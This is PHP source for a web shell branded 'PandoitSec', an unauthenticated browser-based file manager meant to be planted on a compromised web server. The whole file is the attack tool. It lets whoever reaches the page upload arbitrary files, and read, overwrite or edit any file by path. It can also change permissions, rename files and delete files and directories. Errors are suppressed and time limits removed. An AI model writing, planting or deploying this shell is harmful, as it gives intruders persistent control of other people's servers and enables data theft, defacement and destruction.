<?php
    function minify($buffer)
    {
        $protected_parts = array('<pre>,</pre>','<,>'); //Bagian yang tidak diminify
        $extracted_values = array();
        $i = 0;

        foreach ($protected_parts as $part) {
            $finished = false;
            $search_offset = $first_offset = 0;
            $end_offset = 1;
            $startend = explode(',', $part);

            if (count($startend) === 1) $startend[1] = $startend[0];
            $len0 = strlen($startend[0]); $len1 = strlen($startend[1]);

            while ($finished === false) {
                $first_offset = strpos($buffer, $startend[0], $search_offset);

                if ($first_offset === false) $finished = true;
                else {
                    $search_offset = strpos($buffer, $startend[1], $first_offset + $len0);
                    $extracted_values[$i] = substr($buffer, $first_offset + $len0, $search_offset - $first_offset - $len0);
                    $buffer = substr($buffer, 0, $first_offset + $len0).'$$#'.$i.'$$'.substr($buffer, $search_offset);
                    $search_offset += $len1 + strlen((string)$i) + 5 - strlen($extracted_values[$i]);
                    ++$i;
                }
            }
        }

        $buffer = preg_replace("/\s/", " ", $buffer);
        $buffer = preg_replace("/\s{2,}/", " ", $buffer);
        $replace = array('> <'=>'><', ' >'=>'>','< '=>'<','</ '=>'</');
        $buffer = str_replace(array_keys($replace), array_values($replace), $buffer);

        for ($d = 0; $d < $i; ++$d)
            $buffer = str_replace('$$#'.$d.'$$', $extracted_values[$d], $buffer);

        return $buffer;
     }
?>
<?php ob_start("minify") ?>
<?php
set_time_limit(0);
error_reporting(0);

if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}
echo '<!DOCTYPE html>
<html>
<head>
<title>PandoitSec</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="http://localhost/pelita/assets/bootstrap/css/bootstrap.min.css">
<link rel="stylesheet" href="http://localhost/tobareload/assets/css/font-awesome.min.css">
<style>
body{
background-color: #000000;
background-image: url(bg2.gif)!important;
background-size: cover!important;
color: #ff0000!important;
font-family: Consolas,"courier new"!important;
}
a{
color: #ff0000!important;
}
.btn{
border: 1px solid #ffffff!important;
}
.form-control{
background-color: #000000!important;
color: #ff0000;
}
.btn-danger{
background: #000000!important;
color: #ff0000!important;
}
</style>
</head>
<body>
<div class="container">
<div class="row">
<div class="col-sm-3">
<br><img src="hack.png" class="img-responsive hidden-xs">
</div>
<div class="col-sm-6">
<h1 style="margin-top:20px;margin-bottom:20px;">
<center>PandoitSec</center>
</h1>
<div class="table-responsive">
<table class="table table-bordered">
<tr><td>';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="green"><i class="fa fa-check-square"></i> Upload Success</font><br /><br/>';
}else{
echo '<font color="red"><i class="fa fa-warning"></i> Something Error</font><br /><br />';
}
}
echo '
<form enctype="multipart/form-data" method="post">
<div class="input-group">
<label class="input-group-btn">
<span class="btn btn-danger">Choose File<input type="file" style="display: none;" name="file"/></span>
</label>
<input type="text" class="form-control" value="No File Chosen" readonly="readonly"/>
<span class="input-group-btn">
<input type="submit" class="btn btn-danger" value="upload"/>
</span>
</div>
</form>
</td></tr>';
if(isset($_GET['filesrc'])){
echo "<tr><td>";
echo $_GET['filesrc'];
echo '</tr></td></table></div>';
echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table></div>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="green"><i class="fa fa-check-square"></i> Chmod Changed</font><br /><br />';
}else{
echo '<font color="red"><i class="fa fa-warning"></i> Something Error</font><br /><br />';
}
}
echo '<form method="post">
<div class="input-group">
<input name="perm" type="text" class="form-control" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" placeholder="Chmod" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<span class="input-group-btn">
<input type="submit" value="Change" class="btn btn-danger" />
</span>
</div>
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="green"><i class="fa fa-check-square"></i> Name Changed</font><br /><br />';
}else{
echo '<font color="red"><i class="fa fa-warning"></i> Something Error</font><br /><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="post">
<div class="input-group">
<input name="newname" type="text" class="form-control" size="20" value="'.$_POST['name'].'" placeholder="Name" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<span class="input-group-btn">
<input type="submit" value="Rename" class="btn btn-danger" />
</span>
</div>
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="green"><i class="fa fa-check-square"></i> Edited Saved</font><br /><br />';
}else{
echo '<font color="red"><i class="fa fa-warning"></i> Something Error</font><br /><br />';
}
fclose($fp);
}
echo '<form method="post">
<textarea name="src" class="form-control" style="height: 250px; resize: none;">
'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Save" class="btn btn-danger btn-block" />
</form>';
}
}else{
echo '</table></div>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="green"><i class="fa fa-check-square"></i> Directory Deleted</font><br /><br />';
}else{
echo '<font color="red"><i class="fa fa-warning"></i> Something Error</font><br /><br />';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="green"><i class="fa fa-check-square"></i> File Deleted</font><br /><br />';
}else{
echo '<font color="red"><i class="fa fa-warning"></i> Something Error</font><br /><br />';
}
}
}
$scandir = scandir($path);
echo '
<div class="table-responsive">
<table class="table table-bordered">
<tr>
<th>Name</th>
<th>Size</th>
<th>Chmod</th>
<th>Options</th>
</tr>';

foreach($scandir as $dir){
if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
echo "<tr>
<td><a href=\"?path=$path/$dir\">$dir</a></td>
<td>-</td>
<td>";
if(is_writable("$path/$dir")) echo '<font color="red">';
elseif(!is_readable("$path/$dir")) echo '<font color="red">';
echo perms("$path/$dir");
if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';

echo "</td>
<td><form method=\"post\" action=\"?option&path=$path\">
<div class=\"input-group\">
<select name=\"opt\" class=\"form-control\">
<option value=\"delete\">Delete</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Rename</option>
</select>
<span class=\"input-group-btn\">
<input type=\"hidden\" name=\"type\" value=\"dir\">
<input type=\"hidden\" name=\"name\" value=\"$dir\">
<input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
<input type=\"submit\" value=\"Exe\" class=\"btn btn-danger\"/>
</span>
</div>
</form>
</td>
</tr>";
}
echo '';
foreach($scandir as $file){
if(!is_file("$path/$file")) continue;
$size = filesize("$path/$file")/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo "<tr>
<td><a href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
<td>".$size."</td>
<td>";
if(is_writable("$path/$file")) echo '<font color="red">';
elseif(!is_readable("$path/$file")) echo '<font color="red">';
echo perms("$path/$file");
if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
echo "</td>
<td><form method=\"post\" action=\"?option&path=$path\">
<div class=\"input-group\">
<select name=\"opt\" class=\"form-control\">
<option value=\"delete\">Delete</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Rename</option>
<option value=\"edit\">Edit</option>
</select>
<span class=\"input-group-btn\">
<input type=\"hidden\" name=\"type\" value=\"file\">
<input type=\"hidden\" name=\"name\" value=\"$file\">
<input type=\"hidden\" name=\"path\" value=\"$path/$file\">
<input type=\"submit\" value=\"Exe\" class=\"btn btn-danger\"/>
</span>
</div>
</form></td>
</tr>";
}
echo '
</table></div>';
}
$year = date('Y');
echo '
<div style="margin-top: 20px; margin-bottom: 20px;">
Copyright &copy;'.$year.' PandoitSec. Allrights Reserved.
</div>
</div>
<div class="col-sm-3">
<br><img src="hack.png" class="img-responsive hidden-xs">
</div>
</div>
</div>
</body>
</html>';
function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
?>
<?php ob_end_flush() ?>